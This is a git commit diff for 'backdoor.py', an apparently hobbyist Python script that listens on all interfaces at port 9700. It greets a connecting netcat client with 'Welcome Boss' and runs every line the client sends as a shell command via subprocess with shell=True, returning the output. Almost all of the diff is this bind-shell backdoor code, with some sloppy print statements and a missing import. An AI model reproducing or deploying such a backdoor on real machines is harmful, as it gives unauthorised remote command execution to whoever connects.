d041ed24b426409b2da44ee199ddb1a572093313
Justin <justin.db83@gmail.com>
2017-01-24 14:22:16 -0700

    updated files

--- backdoor.py
+++ backdoor.py
@@ -2,9 +2,10 @@ import socket
 import getopt
 import sys
 
+# Sample usage
 # get opts makes it easier to parse the program arguments
 # backdoor.py -l -p 2017 -c     creates the backdoor listen server
-# python backdoor.py -h localhost -p 2017
+# nc localhost 2017
 # the client connecting to server (and to see a shell to run commands).
 
 
@@ -20,36 +21,77 @@ def start():
     global PORT
     global SHELL_COMMAND
 
-    myopts, args = getopt.getopt(sys.argv[1:], "l:h:p:c")
+    ## this is not working here, hard coded in port
+    ## need to read documentation on get opt agan
+    myopts, args = getopt.getopt(sys.argv[1:], "l:h:p")
     # o == option
     # a == argument
     for o, a in myopts:
         if o == '-l':
             LISTEN = True  # set the listen (server) flag
-        elif o == '-h':
-            HOST = a
+        # elif o == '-h':
+        #    HOST = a
         elif o == '-p':
             PORT = a
-        elif o == '-c':
-            SHELL_COMMAND = a
 
+    print
+    "the port"
+    print
+    PORT
     # if true, run in netcat listen mode (server).
     if LISTEN == True:
         HOST = '0.0.0.0'
-        server_listen()
+        PORT = 9700
+        server_connector()
+
 
         # if false, run in netcat client mode
         # if LISTEN == False:
 
-def server_listen():
-    #Create a simple waiting loop for clients to connect to
-    #the server
-    server = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
-    server.bind(( TARGET, PORT))
+
+def server_connector():
+    # Create a simple waiting loop for clients to connect to
+    # the server
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
     server.listen(1)  ## only need to allow 1 client connection
+    print
+    "Waiting for socket connection at " + HOST + ":" + str(PORT)
 
     while True:
         clientSocket, addr = server.accept()
+        print
+        "NC Client has connected via" + addr[0] + ":" + str(addr[1])
+        server_listener(clientSocket)
+
+
+## this function deals with netcat commands from client connection
+def server_listener(clientSocket):
+    while True:
+        clientSocket.send("Welcome Boss: \n")
+        bashCommand = ''
+        while "\n" not in bashCommand:
+            bashCommand += clientSocket.recv(1024)
+        bashCommand = bashCommand.rstrip()
+        print
+        "Client Entered: " + bashCommand
+
+        try:
+            output = subprocess.check_output(bashCommand, stderr=subprocess.STDOUT, \
+                                             shell=True)
+        except:
+            output = "Not a valid bash command \n"
+
+        clientSocket.send(output)
+
 
 if __name__ == '__main__':
     start()
+
+
+
+
+
+
+
+
